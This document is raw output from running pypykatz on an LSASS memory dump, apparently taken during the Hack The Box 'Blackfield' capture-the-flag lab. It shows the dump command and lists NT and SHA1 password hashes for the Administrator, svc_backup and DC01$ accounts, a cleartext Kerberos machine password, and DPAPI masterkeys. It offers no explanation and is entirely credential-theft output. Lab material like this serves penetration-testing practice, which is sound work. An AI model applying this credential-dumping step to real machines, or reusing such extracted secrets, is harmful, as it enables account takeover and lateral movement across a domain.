# pypykatz output on lsass.DMP

The output is 

```text
root@kali:~/CTF/HTB/Blackfield/memory_dump# pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == SSP [633ba]==
                username
                domainname
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == SSP [25869]==
                username
                domainname
                password None
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None
        == SSP [3e4]==
                username
                domainname
                password None
        == SSP [3e4]==
                username
                domainname
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
        == WDIGEST [3e5]==
                username
                domainname
                password None
        == SSP [3e5]==
                username
                domainname
                password None
        == SSP [3e5]==
                username
                domainname
                password None
        == Kerberos ==
                Username:
                Domain:
                Password: None
        == WDIGEST [3e5]==
                username
                domainname
                password None

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == DPAPI [3e7]==
                luid 999
                key_guid f7e926c-c502-4cad-90fa-32b78425b5a9
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
        == DPAPI [3e7]==
                luid 999
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
        == DPAPI [3e7]==
                luid 999
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
        == DPAPI [3e7]==
                luid 999
                key_guid 7e0da320-72c-4b4a-969f-62087d9f9870
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```

